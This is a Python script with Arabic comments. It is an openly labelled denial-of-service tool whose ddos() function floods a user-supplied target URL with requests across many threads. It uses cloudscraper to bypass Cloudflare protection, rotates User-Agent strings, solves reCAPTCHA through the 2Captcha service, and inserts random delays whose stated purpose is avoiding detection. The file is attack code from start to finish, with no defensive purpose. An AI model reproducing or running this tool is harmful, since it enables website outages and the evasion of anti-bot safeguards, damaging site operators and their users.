import requests
import threading
import random
import cloudscraper
import time
from queue import Queue

# قائمة رؤوس المستخدم (User-Agent)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
]

# قائمة عناوين URL المستهدفة
urls = Queue()

# إضافة وظيفة لحل CAPTCHA باستخدام 2Captcha (اختياري)
def solve_captcha(site_key, url):
    api_key = 'YOUR_2CAPTCHA_API_KEY'  # ضع مفتاح API الخاص بك هنا
    captcha_url = 'http://2captcha.com/in.php'
    params = {
        'key': api_key,
        'method': 'userrecaptcha',
        'googlekey': site_key,
        'pageurl': url,
    }
    response = requests.post(captcha_url, data=params)
    request_result = response.text.split('|')
    
    if request_result[0] == 'OK':
        captcha_id = request_result[1]
        result_url = f'http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}'
        for _ in range(30):  # محاولات للحصول على النتيجة
            captcha_result = requests.get(result_url)
            if 'OK' in captcha_result.text:
                return captcha_result.text.split('|')[1]
            time.sleep(5)
    return None

def ddos():
    """
    إرسال طلبات مع تخطي الحماية.
    """
    scraper = cloudscraper.create_scraper()  # إنشاء Scraper
    while not urls.empty():
        url = urls.get()
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = scraper.get(url, headers=headers, timeout=5)  # إرسال الطلب مع تخطي الحماية

            # إذا كان الموقع يحتوي على reCAPTCHA أو شيء مشابه، يمكن حل التحدي هنا
            if "recaptcha" in response.text:
                site_key = "site_key_of_the_target"  # استخرج المفتاح من HTML
                captcha_solution = solve_captcha(site_key, url)
                if captcha_solution:
                    response = scraper.get(url, headers=headers, params={"g-recaptcha-response": captcha_solution}, timeout=5)

            # إضافة تأخير عشوائي بين الطلبات لتجنب الكشف
            time.sleep(random.uniform(0.5, 2.5))  # تأخير بين 0.5 إلى 2.5 ثانية
            urls.task_done()
        except requests.exceptions.RequestException:
            urls.task_done()

def main():
    """
    الإعداد الرئيسي للهجوم.
    """
    target = input("Enter the target URL (with http/https): ").strip()
    thread_count = int(input("Enter the number of threads: "))
    request_count = int(input("Enter the total number of requests: "))

    # التحقق من القيم المدخلة
    if thread_count <= 0 or request_count <= 0:
        print("Invalid input. The number of threads and requests must be greater than 0.")
        return

    # ملء قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الطلبات
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
